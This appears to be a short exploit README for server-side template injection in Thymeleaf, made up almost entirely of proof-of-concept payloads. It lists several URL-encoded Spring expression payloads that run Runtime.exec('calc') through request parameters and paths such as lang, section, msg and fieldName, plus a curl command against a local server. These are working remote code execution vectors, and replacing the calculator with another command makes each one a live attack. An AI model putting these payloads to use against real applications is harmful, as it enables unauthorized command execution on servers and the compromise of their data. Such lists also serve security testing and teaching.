# Exploit Thymeleaf
Thymeleaf SSTI

# PoC
* `/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x`
* `/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x`
* `/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x`

* `/url?link=($%7bT(java.lang.Runtime).getRuntime().exec('calc')%7d)`
* `/message?msg=${T(java.lang.Runtime).getRuntime().exec('calc')}`
* `/selector?fieldName=T(java.lang.Runtime).getRuntime().exec('calc')`
* `/variable?fieldName=name eq T(java.lang.Runtime).getRuntime().exec('calc')`
* `/frag?section=${T(java.lang.Runtime).getRuntime().exec('calc')}`
* `curl "http://localhost:8080/(\$\{T(java.lang.Runtime).getRuntime().exec('calc')\})" -H 'Accept: text/html'`